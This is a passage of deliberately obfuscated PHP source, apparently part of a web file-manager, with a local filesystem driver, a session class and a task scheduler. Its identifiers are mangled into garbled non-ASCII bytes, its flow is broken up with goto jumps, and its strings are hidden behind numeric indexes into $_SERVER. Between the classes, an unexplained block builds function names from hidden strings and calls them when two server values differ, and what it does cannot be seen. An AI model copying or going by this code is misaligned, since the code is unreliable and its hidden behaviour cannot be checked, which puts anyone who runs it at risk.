$B°ñ ˆÜ²¤ = array($Cì¢­èÆà¯[77] => $bù×Ù¯È‚£, $Cì¢­èÆà¯[29] => $Cì¢­èÆà¯[167]); } else { $bÌÁí‹˜Ì = @ftp_chdir($this->connect, $this->iconvSystem($BÃºìº¤¬¦)); $B°ñ ˆÜ²¤ = $bÌÁí‹˜Ì ? array($Cì¢­èÆà¯[77] => 0, $Cì¢­èÆà¯[29] => $Cì¢­èÆà¯[76]) : !1; } Cache::set($fÇÖ¡èÍâÂ, $B°ñ ˆÜ²¤, 0); goto C°ÁĞÜ©Š¹; C°ÁĞÜ©Š¹: return $B°ñ ˆÜ²¤; goto Aæ‡¥Š‡î‹; Aæ‡¥Š‡î‹: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($fä™ÕøŸ¬) { if (substr($fä™ÕøŸ¬, 0, 2) == $_SERVER[¼€¼ˆ¦‚¡][1155]) { $fä™ÕøŸ¬ = BASIC_PATH . substr($fä™ÕøŸ¬, 2); } return $fä™ÕøŸ¬; } public function iconvApp($d‘­È’çÑ) { $EÜŒİƒÔĞ‘ =& $_SERVER[¼€¼ˆ¦‚¡]; global $config; return $this->iconvTo($d‘­È’çÑ, $config[$EÜŒİƒÔĞ‘[1153]], $config[$EÜŒİƒÔĞ‘[1152]]); } public function iconvSystem($eœ¯ªò ‚Ÿ) { $e„¢æßùÕ =& $_SERVER[¼€¼ˆ¦‚¡]; global $config; return $this->iconvTo($eœ¯ªò ‚Ÿ, $config[$e„¢æßùÕ[1152]], $config[$e„¢æßùÕ[1153]]); } public function getPathOuter($FéâŒ‹âáö) { goto c¨£”´àÔ£; D™¨·†ƒù: $FéâŒ‹âáö = KodIO::clear($FéâŒ‹âáö); $FéâŒ‹âáö = substr($FéâŒ‹âáö, strlen($f‚àè¤††·)); if (empty($this->pathDriver)) { return $FéâŒ‹âáö; } goto A¨¹ŠíĞºï; D«ˆêô‚ƒ: if (substr($f‚àè¤††·, 0, 2) == $fÆ×è¼«Õ[1155]) { $f‚àè¤††· = BASIC_PATH . substr($f‚àè¤††·, 2); } if (substr($FéâŒ‹âáö, 0, 2) == $fÆ×è¼«Õ[1155]) { $FéâŒ‹âáö = BASIC_PATH . substr($FéâŒ‹âáö, 2); } $f‚àè¤††· = KodIO::clear($f‚àè¤††·); goto D™¨·†ƒù; A¨¹ŠíĞºï: return $this->pathDriver . $fÆ×è¼«Õ[8] . ltrim($FéâŒ‹âáö, $fÆ×è¼«Õ[8]); goto f¤ƒá“ã¹; c¨£”´àÔ£: $fÆ×è¼«Õ =& $_SERVER[¼€¼ˆ¦‚¡]; $f‚àè¤††· = $this->iconvApp($this->pathBase); $FéâŒ‹âáö = $this->iconvApp($FéâŒ‹âáö); goto D«ˆêô‚ƒ; f¤ƒá“ã¹: } public function mkfile($f’Ì£–º…ã, $AšÆ¼‰÷ù = '', $F¬™Ø¦—‚» = REPEAT_RENAME) { $f’Ì£–º…ã = $this->iconvSystem($f’Ì£–º…ã); @touch($f’Ì£–º…ã); if ($AšÆ¼‰÷ù) { file_put_contents($f’Ì£–º…ã, $AšÆ¼‰÷ù); } return is_file($f’Ì£–º…ã) ? $this->getPathOuter($f’Ì£–º…ã) : !1; } public function mkdir($Dò¨…¬·è, $C¾Ä²Ñàà» = REPEAT_SKIP) { $Dò¨…¬·è = $this->iconvSystem($Dò¨…¬·è); if (is_dir($Dò¨…¬·è)) { return $this->getPathOuter($Dò¨…¬·è); } @mkdir($Dò¨…¬·è, 511, !0); return is_dir($Dò¨…¬·è) ? $this->getPathOuter($Dò¨…¬·è) : !1; } public function copyFile($Eó†æö©ƒ‘, $a–Ûß½ìÌä) { $this->mkdir($this->pathFather($a–Ûß½ìÌä)); $Eó†æö©ƒ‘ = $this->iconvSystem($Eó†æö©ƒ‘); $a–Ûß½ìÌä = $this->iconvSystem($a–Ûß½ìÌä); $D÷‚¿–÷†– = @copy($Eó†æö©ƒ‘, $a–Ûß½ìÌä); return $D÷‚¿–÷†– ? $this->getPathOuter($a–Ûß½ìÌä) : !1; } public function moveFile($dÃ…Ü× å, $DÕ˜½›ÜÜ) { $this->mkdir($this->pathFather($DÕ˜½›ÜÜ)); $dÃ…Ü× å = $this->iconvSystem($dÃ…Ü× å); $DÕ˜½›ÜÜ = $this->iconvSystem($DÕ˜½›ÜÜ); $B®­ÕÕğğ‡ = intval(@rename($dÃ…Ü× å, $DÕ˜½›ÜÜ)); if (!$B®­ÕÕğğ‡) { if ($B®­ÕÕğğ‡ = intval(@copy($dÃ…Ü× å, $DÕ˜½›ÜÜ))) { @unlink($dÃ…Ü× å); } } return $B®­ÕÕğğ‡ ? $this->getPathOuter($DÕ˜½›ÜÜ) : !1; } public function delFile($eù‰Ì‡Àğ) { $eù‰Ì‡Àğ = $this->iconvSystem($eù‰Ì‡Àğ); if (!@unlink($eù‰Ì‡Àğ)) { @chmod($eù‰Ì‡Àğ, 511); if (!@unlink($eù‰Ì‡Àğ)) { return !1; } } else { return !0; } } public function delFolder($eá…â²Ç­Œ) { goto FÑ‰’Çå¼; fÚøÅ¦‹ÉÔ: return rmdir($eá…â²Ç­Œ); goto C‡ÉŸÃÁñØ; FÑ‰’Çå¼: $Fë¢»•ÑÑŒ =& $_SERVER[¼€¼ˆ¦‚¡]; $eá…â²Ç­Œ = $this->iconvSystem($eá…â²Ç­Œ); if (!is_dir($eá…â²Ç­Œ)) { return !0; } goto cƒŒ´é†‰‚; cƒŒ´é†‰‚: if (!($C•¿§æÑñº = opendir($eá…â²Ç­Œ))) { return !1; } while (($BÃ©“²ÔÉÇ = readdir($C•¿§æÑñº)) !== !1) { if ($BÃ©“²ÔÉÇ == $Fë¢»•ÑÑŒ[91] || $BÃ©“²ÔÉÇ == $Fë¢»•ÑÑŒ[1165]) { continue; } $A÷ª°Õ¾—Ù = $eá…â²Ç­Œ . $Fë¢»•ÑÑŒ[8] . $BÃ©“²ÔÉÇ; if (is_file($A÷ª°Õ¾—Ù) || is_link($A÷ª°Õ¾—Ù)) { if (!unlink($A÷ª°Õ¾—Ù)) { chmod($A÷ª°Õ¾—Ù, 511); if (!unlink($A÷ª°Õ¾—Ù)) { return !1; } } } else { if (is_dir($A÷ª°Õ¾—Ù)) { chmod($A÷ª°Õ¾—Ù, 511); $A÷ª°Õ¾—Ù = $this->iconvApp($A÷ª°Õ¾—Ù); if (!$this->delFolder($A÷ª°Õ¾—Ù)) { return !1; } } } } closedir($C•¿§æÑñº); goto fÚøÅ¦‹ÉÔ; C‡ÉŸÃÁñØ: } public function rename($B™Ì»™—… , $c´´ÔŒ™è¬) { goto C’¹Å™¹æ; Bë‹ÅÓó¦±: $B™Ì»™—…  = $this->iconvSystem($B™Ì»™—… ); $f¾ùñ±êää = $this->pathFather($B™Ì»™—… ); $dØÌ„”­­ = rtrim($f¾ùñ±êää, $AÀÚ¥ÙÉ“Â[8]) . $AÀÚ¥ÙÉ“Â[8] . $fõ¹˜–İ«î; goto B¾¤ª—ÜŞ†; C’¹Å™¹æ: $AÀÚ¥ÙÉ“Â =& $_SERVER[¼€¼ˆ¦‚¡]; $fõ¹˜–İ«î = $this->fileNameAuto($this->pathFather($B™Ì»™—… ), $c´´ÔŒ™è¬); $fõ¹˜–İ«î = $this->iconvSystem($fõ¹˜–İ«î); goto Bë‹ÅÓó¦±; B¾¤ª—ÜŞ†: $bôğ§¦–² = @rename($B™Ì»™—… , $dØÌ„”­­); $dØÌ„”­­ = $this->iconvApp($dØÌ„”­­); return $bôğ§¦–² ? $this->getPathOuter($dØÌ„”­­) : !1; goto D±¯ÓÜ†ãƒ; D±¯ÓÜ†ãƒ: } public function size($a×íë•ù¦í) { $a×íë•ù¦í = $this->iconvSystem($a×íë•ù¦í); return (double) abs(sprintf($_SERVER[¼€¼ˆ¦‚¡][1167], @filesize($a×íë•ù¦í))); } public function info($E‹´õ‰ô‘Ñ) { $E‹´õ‰ô‘Ñ = $this->iconvSystem($E‹´õ‰ô‘Ñ); if ($this->isFolder($E‹´õ‰ô‘Ñ)) { return $this->folderInfo($E‹´õ‰ô‘Ñ); } else { if ($this->isFile($E‹´õ‰ô‘Ñ)) { return $this->fileInfo($E‹´õ‰ô‘Ñ); } } return !1; } protected function infoChildren($a˜Ş„¢ †¢, &$FƒÑÖ…®‹‘, $D›é¡ëº“Õ = true) { goto fî°æŸƒ…; bš×–¢Íµ¯: closedir($Aø°ØÃâŸ); goto cöÖëÆˆ¼ª; C™çÔ° ªç: if ($D›é¡ëº“Õ) { $a˜Ş„¢ †¢ = $this->iconvSystem($a˜Ş„¢ †¢); } if (!($Aø°ØÃâŸ = @opendir($a˜Ş„¢ †¢))) { return; } while (($aù¶à²íäì = readdir($Aø°ØÃâŸ)) !== !1) { if ($aù¶à²íäì == $Ağ¹å‹·å¶[91] || $aù¶à²íäì == $Ağ¹å‹·å¶[1165]) { continue; } $fä·É‡Áé = $a˜Ş„¢ †¢ . $aù¶à²íäì; if (is_file($fä·É‡Áé) || is_link($fä·É‡Áé)) { $FƒÑÖ…®‹‘[$Ağ¹å‹·å¶[78]]++; $FƒÑÖ…®‹‘[$Ağ¹å‹·å¶[77]] += (double) abs(sprintf($Ağ¹å‹·å¶[1167], @filesize($fä·É‡Áé))); } else { if (is_dir($fä·É‡Áé)) { $FƒÑÖ…®‹‘[$Ağ¹å‹·å¶[79]]++; $this->infoChildren($fä·É‡Áé, $FƒÑÖ…®‹‘, !1); } } } goto bš×–¢Íµ¯; fî°æŸƒ…: $Ağ¹å‹·å¶ =& $_SERVER[¼€¼ˆ¦‚¡]; check_abort(); $a˜Ş„¢ †¢ = rtrim($a˜Ş„¢ †¢, $Ağ¹å‹·å¶[8]) . $Ağ¹å‹·å¶[8]; goto C™çÔ° ªç; cöÖëÆˆ¼ª: } private function folderInfo($DÙƒçê‚´Ù, $D¶ˆÑòÀĞİ = false) { $Eô¦ˆµÒÎ“ =& $_SERVER[¼€¼ˆ¦‚¡]; $DÙƒçê‚´Ù = rtrim($DÙƒçê‚´Ù, $Eô¦ˆµÒÎ“[8]) . $Eô¦ˆµÒÎ“[8]; $aÜÂ™½¿öõ = $this->iconvApp($this->pathThis($DÙƒçê‚´Ù)); if ($D¶ˆÑòÀĞİ) { return array($Eô¦ˆµÒÎ“[28] => $aÜÂ™½¿öõ, $Eô¦ˆµÒÎ“[75] => $this->getPathOuter($DÙƒçê‚´Ù), $Eô¦ˆµÒÎ“[29] => $Eô¦ˆµÒÎ“[76]); } $a÷È¶Å´¿× = array($Eô¦ˆµÒÎ“[28] => $aÜÂ™½¿öõ, $Eô¦ˆµÒÎ“[75] => $this->getPathOuter($DÙƒçê‚´Ù), $Eô¦ˆµÒÎ“[29] => $Eô¦ˆµÒÎ“[76], $Eô¦ˆµÒÎ“[187] => @filectime($DÙƒçê‚´Ù), $Eô¦ˆµÒÎ“[107] => @filemtime($DÙƒçê‚´Ù), $Eô¦ˆµÒÎ“[1168] => @fileatime($DÙƒçê‚´Ù), $Eô¦ˆµÒÎ“[1162] => is_readable($DÙƒçê‚´Ù), $Eô¦ˆµÒÎ“[1163] => is_writable($DÙƒçê‚´Ù), $Eô¦ˆµÒÎ“[1169] => get_mode($DÙƒçê‚´Ù)); return $a÷È¶Å´¿×; } private function fileInfo($c„éÖ›†Äƒ, $A³ñè™ÍÚ° = false) { $e˜öõÄ÷™‹ =& $_SERVER[¼€¼ˆ¦‚¡]; $fÓà¯Ù¢¥ = $this->iconvApp($this->pathThis($c„éÖ›†Äƒ)); if ($A³ñè™ÍÚ°) { return array($e˜öõÄ÷™‹[28] => $fÓà¯Ù¢¥, $e˜öõÄ÷™‹[75] => $this->getPathOuter($c„éÖ›†Äƒ), $e˜öõÄ÷™‹[29] => $e˜öõÄ÷™‹[167], $e˜öõÄ÷™‹[77] => $this->size($c„éÖ›†Äƒ), $e˜öõÄ÷™‹[160] => $this->ext($fÓà¯Ù¢¥)); } $CîìèŒ›êä = array($e˜öõÄ÷™‹[28] => $fÓà¯Ù¢¥, $e˜öõÄ÷™‹[75] => $this->getPathOuter($c„éÖ›†Äƒ), $e˜öõÄ÷™‹[29] => $e˜öõÄ÷™‹[167], $e˜öõÄ÷™‹[187] => @filectime($c„éÖ›†Äƒ), $e˜öõÄ÷™‹[107] => @filemtime($c„éÖ›†Äƒ), $e˜öõÄ÷™‹[1168] => @fileatime($c„éÖ›†Äƒ), $e˜öõÄ÷™‹[77] => $this->size($c„éÖ›†Äƒ), $e˜öõÄ÷™‹[160] => $this->ext($fÓà¯Ù¢¥), $e˜öõÄ÷™‹[1162] => is_readable($c„éÖ›†Äƒ), $e˜öõÄ÷™‹[1163] => is_writable($c„éÖ›†Äƒ), $e˜öõÄ÷™‹[1169] => get_mode($c„éÖ›†Äƒ)); return $CîìèŒ›êä; } public function exist($c±›·åª) { $c±›·åª = $this->iconvSystem($c±›·åª); return @file_exists($c±›·åª); } public function isFile($Eå³ÖâÓÕå) { $Eå³ÖâÓÕå = $this->iconvSystem($Eå³ÖâÓÕå); return @is_file($Eå³ÖâÓÕå); } public function isFolder($EÕ°¸Ô‰³å) { $EÕ°¸Ô‰³å = $this->iconvSystem($EÕ°¸Ô‰³å); return @is_dir($EÕ°¸Ô‰³å); } public function listPath($Eè‡Œëšš, $fƒàµºª  = false) { goto A¹–âÜÄí; A°šöøĞ•™: $fæ™¬ÔÑÓÑ = array($dÄ‚„½¥ÚÜ[74] => array(), $dÄ‚„½¥ÚÜ[73] => array()); if (!($DÇëßß»å = @opendir($Eè‡Œëšš))) { return $fæ™¬ÔÑÓÑ; } while (($aÕ”§°¼ = readdir($DÇëßß»å)) !== !1) { if ($aÕ”§°¼ == $dÄ‚„½¥ÚÜ[91] || $aÕ”§°¼ == $dÄ‚„½¥ÚÜ[1165]) { continue; } $E™Ë˜‡Ú‚ƒ = $Eè‡Œëšš . $aÕ”§°¼; if (is_file($E™Ë˜‡Ú‚ƒ)) { $fæ™¬ÔÑÓÑ[$dÄ‚„½¥ÚÜ[73]][] = $this->fileInfo($E™Ë˜‡Ú‚ƒ, $fƒàµºª ); } else { $fæ™¬ÔÑÓÑ[$dÄ‚„½¥ÚÜ[74]][] = $this->folderInfo($E™Ë˜‡Ú‚ƒ, $fƒàµºª ); } } goto b”Ä®ë–ƒÕ; A¹–âÜÄí: $dÄ‚„½¥ÚÜ =& $_SERVER[¼€¼ˆ¦‚¡]; $Eè‡Œëšš = $this->iconvSystem($Eè‡Œëšš); $Eè‡Œëšš = rtrim($Eè‡Œëšš, $dÄ‚„½¥ÚÜ[8]) . $dÄ‚„½¥ÚÜ[8]; goto A°šöøĞ•™; b”Ä®ë–ƒÕ: closedir($DÇëßß»å); return $fæ™¬ÔÑÓÑ; goto AãçŸóã¸; AãçŸóã¸: } public function listAll($B§ÛÃÉÄ˜, &$fñ‰íƒ£ä = array()) { goto f‰ğˆŒâºù; bÔË·§‘æ: return $fñ‰íƒ£ä; goto b°÷ÂÊÜù¯; A˜ß‘øùá: if (!($Fí§öÊáê‘ = @opendir($B§ÛÃÉÄ˜))) { return $fñ‰íƒ£ä; } while (($e«–£äéãß = readdir($Fí§öÊáê‘)) !== !1) { if ($e«–£äéãß == $D†æÉ­»Äš[91] || $e«–£äéãß == $D†æÉ­»Äš[1165]) { continue; } $cŒë©ÁğŠù = $B§ÛÃÉÄ˜ . $e«–£äéãß; if (is_dir($cŒë©ÁğŠù) && !is_link($cŒë©ÁğŠù)) { $fñ‰íƒ£ä[] = array($D†æÉ­»Äš[75] => $cŒë©ÁğŠù . $D†æÉ­»Äš[8], $D†æÉ­»Äš[76] => 1, $D†æÉ­»Äš[107] => @filemtime($cŒë©ÁğŠù), $D†æÉ­»Äš[77] => 0); $this->listAll($cŒë©ÁğŠù, $fñ‰íƒ£ä); } else { $fñ‰íƒ£ä[] = array($D†æÉ­»Äš[75] => $cŒë©ÁğŠù, $D†æÉ­»Äš[76] => 0, $D†æÉ­»Äš[107] => @filemtime($cŒë©ÁğŠù), $D†æÉ­»Äš[77] => $this->size($cŒë©ÁğŠù)); } } closedir($Fí§öÊáê‘); goto bÔË·§‘æ; f‰ğˆŒâºù: $D†æÉ­»Äš =& $_SERVER[¼€¼ˆ¦‚¡]; $B§ÛÃÉÄ˜ = $this->iconvSystem($B§ÛÃÉÄ˜); $B§ÛÃÉÄ˜ = rtrim($B§ÛÃÉÄ˜, $D†æÉ­»Äš[8]) . $D†æÉ­»Äš[8]; goto A˜ß‘øùá; b°÷ÂÊÜù¯: } public function has($c¨¡Àò‹èµ, $eó‘•¦½×ø = false, $b›Æ’íËğÁ = true) { goto C‹‚×©‰®º; a›ãç¦ë˜ö: if ($eó‘•¦½×ø) { return array($C¤Æ¹Òƒ¬à[191] => $Bª•Ü°¢ĞÎ, $C¤Æ¹Òƒ¬à[192] => $eŠÜĞš²‡•); } return !1; goto aºÚ·á™íŞ; C‹‚×©‰®º: $C¤Æ¹Òƒ¬à =& $_SERVER[¼€¼ˆ¦‚¡]; $c¨¡Àò‹èµ = $this->iconvSystem($c¨¡Àò‹èµ); $c¨¡Àò‹èµ = rtrim($c¨¡Àò‹èµ, $C¤Æ¹Òƒ¬à[8]) . $C¤Æ¹Òƒ¬à[8]; goto A·Ñç½’Ë; A·Ñç½’Ë: if (!($Aì„¸øÛŒ = @opendir($c¨¡Àò‹èµ))) { return !1; } $Bª•Ü°¢ĞÎ = 0; $eŠÜĞš²‡• = 0; goto BÑŸŞ­ÖÇ‘; BÑŸŞ­ÖÇ‘: $dÕ£Ûå«ø = 0; while (($E­ˆêæÇ = readdir($Aì„¸øÛŒ)) !== !1) { if ($E­ˆêæÇ == $C¤Æ¹Òƒ¬à[91] || $E­ˆêæÇ == $C¤Æ¹Òƒ¬à[1165]) { continue; } $Cóç¥óƒ¯Å = $c¨¡Àò‹èµ . $E­ˆêæÇ; if ($eó‘•¦½×ø) { $dÕ£Ûå«ø++; if (@is_file($Cóç¥óƒ¯Å)) { $Bª•Ü°¢ĞÎ++; } else { $eŠÜĞš²‡•++; } if ($dÕ£Ûå«ø > 10000) { break; } continue; } if ($b›Æ’íËğÁ) { if (@is_file($Cóç¥óƒ¯Å)) { return !0; } } else { if (@is_dir($Cóç¥óƒ¯Å . $C¤Æ¹Òƒ¬à[8])) { return !0; } } } closedir($Aì„¸øÛŒ); goto a›ãç¦ë˜ö; aºÚ·á™íŞ: } public function hashSimple($Bì¬ÍÛæÕÏ) { goto AÓØ £Û˜; fÃ¢¢Ü„É: fseek($Fš—±ˆÚ‘, $EŒÄ«Èß - $E‚¤˜¸à‡ˆ); $f„š†Ê’š .= fread($Fš—±ˆÚ‘, $E‚¤˜¸à‡ˆ); fclose($Fš—±ˆÚ‘); goto Dç…ÅÌŒ¤‹; Dß”ÈƒÃ: if ($EŒÄ«Èß <= $E‚¤˜¸à‡ˆ * $A”ÄôêÃ) { return $this->hashMd5($Bì¬ÍÛæÕÏ) . $EŒÄ«Èß; } $f„š†Ê’š = $Dõê×ÄÉö[33]; $Cğ–Ü¯Ù¶ö = intval($EŒÄ«Èß / $A”ÄôêÃ); goto F±·É‹ÏŸ‰; F±·É‹ÏŸ‰: $Fš—±ˆÚ‘ = fopen($Bì¬ÍÛæÕÏ, $Dõê×ÄÉö[1170]); if (!$Fš—±ˆÚ‘) { return $f„š†Ê’š; } for ($bºñ¥¼îºø = 0; $bºñ¥¼îºø < $A”ÄôêÃ; $bºñ¥¼îºø++) { fseek($Fš—±ˆÚ‘, $Cğ–Ü¯Ù¶ö * $bºñ¥¼îºø); $f„š†Ê’š .= fread($Fš—±ˆÚ‘, $E‚¤˜¸à‡ˆ); } goto fÃ¢¢Ü„É; Dç…ÅÌŒ¤‹: return md5($f„š†Ê’š) . $EŒÄ«Èß; goto C„Î°……; aÚµ½´«°: $EŒÄ«Èß = $this->size($Bì¬ÍÛæÕÏ); $E‚¤˜¸à‡ˆ = 200; $A”ÄôêÃ = 50; goto Dß”ÈƒÃ; AÓØ £Û˜: $Dõê×ÄÉö =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$Bì¬ÍÛæÕÏ) { return md5($Dõê×ÄÉö[33]); } $Bì¬ÍÛæÕÏ = $this->iconvSystem($Bì¬ÍÛæÕÏ); goto aÚµ½´«°; C„Î°……: } public function getContent($FÉğ¯Şù°î) { $FÉğ¯Şù°î = $this->iconvSystem($FÉğ¯Şù°î); return file_get_contents($FÉğ¯Şù°î); } public function setContent($dã›íÅ¨ÕÀ, $C•ö‘ÒÌ¸é = '') { $dã›íÅ¨ÕÀ = $this->iconvSystem($dã›íÅ¨ÕÀ); @file_put_contents($dã›íÅ¨ÕÀ, $C•ö‘ÒÌ¸é, LOCK_EX); clearstatcache(); return strlen($C•ö‘ÒÌ¸é) == filesize($dã›íÅ¨ÕÀ); } public function fileSubstr($eõÏ“†åÆ, $fŒ±ùœ‡œö = 0, $dÆâ¾‰·İ = false) { goto dêùªÂÖÙ›; dêùªÂÖÙ›: $eó…®Çî =& $_SERVER[¼€¼ˆ¦‚¡]; $eõÏ“†åÆ = $this->iconvSystem($eõÏ“†åÆ); if ($dÆâ¾‰·İ === !1) { $dÆâ¾‰·İ = $this->size($eõÏ“†åÆ); } goto EÍã®À¬‘–; d‰ÑÉ‰‰¶¢: fseek($cÅº˜ìÓ‚·, $fŒ±ùœ‡œö); $AÈÓ™æ„Ö© = fread($cÅº˜ìÓ‚·, $dÆâ¾‰·İ); fclose($cÅº˜ìÓ‚·); goto BÌËŒ“äÅš; BÌËŒ“äÅš: return $AÈÓ™æ„Ö©; goto C¯ã½‚åæó; EÍã®À¬‘–: if ($dÆâ¾‰·İ <= 0) { return $eó…®Çî[33]; } $cÅº˜ìÓ‚· = fopen($eõÏ“†åÆ, $eó…®Çî[1170]); if (!$cÅº˜ìÓ‚·) { return !1; } goto d‰ÑÉ‰‰¶¢; C¯ã½‚åæó: } public function upload($cí Ô¢÷, $CŸÉ«—²ë², $B¾„œÔ§ôÎ = false, $D–ŒÑáÉ = REPEAT_REPLACE) { $eÌ¦¯ï• = $this->copyFile($CŸÉ«—²ë², $cí Ô¢÷); return $eÌ¦¯ï• ? $this->getPathOuter($cí Ô¢÷) : !1; } public function setModifyTime($aËÁóÈ¢É, $F½ÇÖİÉ = '') { @touch($aËÁóÈ¢É, intval($F½ÇÖİÉ)); } public function download($b…á–¼“éƒ, $A£µƒàñ©) { return $this->iconvSystem($b…á–¼“éƒ); } } goto A¹ÓÚĞõ–Í; B¡À¥Œ®Ë: register_shutdown_function($_SERVER[¿‰šÇ ][36]); set_error_handler($_SERVER[¿‰šÇ ][49], $dÊ¶ÏíÙÇ¤); if (function_exists($_SERVER[¿‰šÇ ][50])) { set_exception_handler($_SERVER[¿‰šÇ ][51]); } goto BåÏ¶ÁĞÅ; F¥²¤ÉÉğ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto b…Ï«½·§¨; Bğ¨àäí§: return $C…Ş‹ˆ”£; goto EË²¼‚Ë‹‘; b…Ï«½·§¨: $A„µ¶œ¥é° =& $_SERVER[¼€¼ˆ¦‚¡]; static $C…Ş‹ˆ”£ = false; if ($C…Ş‹ˆ”£) { return $C…Ş‹ˆ”£; } goto CëÂÊÆº„; CëÂÊÆº„: $a·‚»á´˜© = $GLOBALS[$A„µ¶œ¥é°[6]][$A„µ¶œ¥é°[337]]; self::$sessionTime = $a·‚»á´˜©[$A„µ¶œ¥é°[1396]]; $FêëÔ´Ñ­Ù = SESSION_ID; goto EÖƒ•¢¤¹Å; EÖƒ•¢¤¹Å: $FêëÔ´Ñ­Ù = _get($GLOBALS, $A„µ¶œ¥é°[1397], $FêëÔ´Ñ­Ù); if (self::$sessionSign) { } else { if (Cookie::get($FêëÔ´Ñ­Ù)) { self::$sessionSign = Cookie::get($FêëÔ´Ñ­Ù); } else { self::$sessionSign = guid(); } } Cookie::setSafe($FêëÔ´Ñ­Ù, self::$sessionSign, self::$sessionTime); goto cëäÑÀŸ; Cï ùïö: switch ($aÓÜî˜ì¡) { case $A„µ¶œ¥é°[17]: self::$handle = Model($A„µ¶œ¥é°[753]); break; case $A„µ¶œ¥é°[754]: self::$handle = new CacheRedis($F«ìñ”â¸®, $aÍ—ŒÂÀ¡É); break; case $A„µ¶œ¥é°[755]: self::$handle = new CacheMemcached($F«ìñ”â¸®, $aÍ—ŒÂÀ¡É); break; case $A„µ¶œ¥é°[167]: $F«ìñ”â¸®[$A„µ¶œ¥é°[75]] = $F«ìñ”â¸®[$A„µ¶œ¥é°[75]] . $A„µ¶œ¥é°[1399]; self::$handle = new CacheFile($F«ìñ”â¸®, $aÍ—ŒÂÀ¡É); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $C…Ş‹ˆ”£ = new self(); goto Bğ¨àäí§; cëäÑÀŸ: $aÓÜî˜ì¡ = $a·‚»á´˜©[$A„µ¶œ¥é°[1398]]; $F«ìñ”â¸® = $a·‚»á´˜©[$aÓÜî˜ì¡]; $aÍ—ŒÂÀ¡É = $a·‚»á´˜©[$A„µ¶œ¥é°[752]]; goto Cï ùïö; EË²¼‚Ë‹‘: } public static function sign($DÇ¤ëÍòŸÉ = false) { $DÇ¤ëÍòŸÉ && (self::$sessionSign = $DÇ¤ëÍòŸÉ); self::init(); return self::$sessionSign; } public static function set($EİÕÜ‘¯Š«, $f”¹İ›Ú‰ = false) { self::init(); if (is_array($EİÕÜ‘¯Š«)) { foreach ($EİÕÜ‘¯Š« as $A­¹À¿¹Â« => $fªÅ†Îóë¸) { array_set_value(self::$data, $A­¹À¿¹Â«, $fªÅ†Îóë¸); } } else { array_set_value(self::$data, $EİÕÜ‘¯Š«, $f”¹İ›Ú‰); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($FÈª”œö¢´ = false) { self::init(); if (!$FÈª”œö¢´) { return self::$data; } return array_get_value(self::$data, $FÈª”œö¢´); } public static function remove($D÷Ó—Ã÷àË) { self::init(); unset(self::$data[$D÷Ó—Ã÷àË]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¼€¼ˆ¦‚¡][757])) { self::$handle->clearTimeout(); } } } if ($_SERVER[$_SERVER[¼€¼ˆ¦‚¡][787]] != $_SERVER[$_SERVER[¼€¼ˆ¦‚¡][1400]]) { goto eÍØ¶ä’Ç ; eÍØ¶ä’Ç : $DçÆçîØ¦ = $_SERVER[¼€¼ˆ¦‚¡][789]; $a‚¬‚‚ÃŠ„ = $_SERVER[$_SERVER[¼€¼ˆ¦‚¡][790]] . $_SERVER[¼€¼ˆ¦‚¡][791]; $bŸáÏäÛõ = $DçÆçîØ¦($a‚¬‚‚ÃŠ„); goto B“ÍôØóê¦; B“ÍôØóê¦: $FÈö‹Ô›¨ = explode($_SERVER[¼€¼ˆ¦‚¡][217], $bŸáÏäÛõ); if (count($FÈö‹Ô›¨) < $_SERVER[¼€¼ˆ¦‚¡][556]) { $DĞµŞùëÕ = $_SERVER[¼€¼ˆ¦‚¡][792]; $DĞµŞùëÕ(); } $a×¢æ¶¤À = $_SERVER[¼€¼ˆ¦‚¡][1049]; goto aé‹©í“„—; aé‹©í“„—: $a×¢æ¶¤À($_SERVER[$_SERVER[¼€¼ˆ¦‚¡][1308]]); goto bİÛ”Å Öƒ; bİÛ”Å Öƒ: } class AutoTask { public static function start() { goto Fß°—“„¼²; B†Ì…ôÏ‘¡: while (!0) { self::cacheClear(); if (self::valueGet($bÁÆ×èŠ[685]) != $bÁÆ×èŠ[83]) { self::valueSet($bÁÆ×èŠ[1401], $bÁÆ×èŠ[468]); self::log($bÁÆ×èŠ[1405]); die; } self::valueSet($bÁÆ×èŠ[1401], $bÁÆ×èŠ[83]); self::valueSet($bÁÆ×èŠ[1402], time()); self::taskRunAll(); sleep(self::valueGet($bÁÆ×èŠ[1406])); } goto A´â¢ƒö›; e•ïÉÙê¯Í: http_close(); self::valueSet($bÁÆ×èŠ[1401], $bÁÆ×èŠ[83]); Hook::bind($bÁÆ×èŠ[1403], $bÁÆ×èŠ[1404]); goto B†Ì…ôÏ‘¡; Fß°—“„¼²: $bÁÆ×èŠ =& $_SERVER[¼€¼ˆ¦‚¡]; if (self::valueGet($bÁÆ×èŠ[685]) != $bÁÆ×èŠ[83]) { return; } if (self::valueGet($bÁÆ×èŠ[1401]) == $bÁÆ×èŠ[83]) { $B¾‰¥„›…Â = self::valueGet($bÁÆ×èŠ[1402]); if (time() - $B¾‰¥„›…Â > 3600 * 2) { self::restart(); } return; } goto e•ïÉÙê¯Í; A´â¢ƒö›: } public static function restart() { $C¸óòœ‚† =& $_SERVER[¼€¼ˆ¦‚¡]; http_close(); self::valueSet($C¸óòœ‚†[685], $C¸óòœ‚†[468]); sleep(self::valueGet($C¸óòœ‚†[1406]) + 5); self::valueSet($C¸óòœ‚†[1401], $C¸óòœ‚†[468]); self::valueSet($C¸óòœ‚†[685], $C¸óòœ‚†[83]); } public static function shutdownEvent() { $D‡„ã¡«Çï =& $_SERVER[¼€¼ˆ¦‚¡]; self::valueSet($D‡„ã¡«Çï[1401], $D‡„ã¡«Çï[468]); self::log($D‡„ã¡«Çï[1407]); } public static function config($e¼Ä²ë‡Æ, $AÇÊ“Ä»ä) { $d®·¿İå° =& $_SERVER[¼€¼ˆ¦‚¡]; 